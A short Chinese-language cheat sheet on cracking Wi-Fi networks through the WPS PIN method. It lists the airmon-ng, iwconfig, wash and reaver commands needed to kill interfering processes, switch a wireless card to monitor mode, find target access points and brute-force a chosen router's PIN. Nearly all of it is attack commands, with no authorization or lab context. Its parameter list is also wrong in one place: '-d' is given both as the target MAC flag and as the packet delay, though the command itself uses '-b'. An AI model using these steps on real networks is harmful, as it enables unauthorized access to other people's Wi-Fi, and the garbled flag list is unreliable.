### Wi-Fi破解(PIN方法)

- 检查可能影响破解的进程并关闭

```bash
sudo airmon-ng check # 检查可能会影响破解的进程
sudo airmon-ng check kill # 自动杀死进程
```

- 将无线网卡设置为monitor模式(必须)

```bash
sudo ifconfig <无线网卡名> down
sudo iwconfig <无线网卡名> mode monitor
sudo ifconfig <无线网卡名> up
```

- 检查周围wifi的MAC地址

```bash
sudo wash -i <无线网卡名>
```

- 开始破解

```bash
sudo reaver -i <无线网卡名> -b <目标MAC> -vv
```

- reaver参数解析

```bash
-i  # 指定网卡
-d  # 目标wifi的MAC地址
-v  # 显示不重要警告信息, 再加个v显示更多
-d  # 发包间延时
-t  # 等待对方回应延时
```

- 关闭monitor模式

```bash
sudo ifconfig <无线网卡名> down
sudo iwconfig <无线网卡名> mode <模式>
sudo ifconfig <无线网卡名> up
```

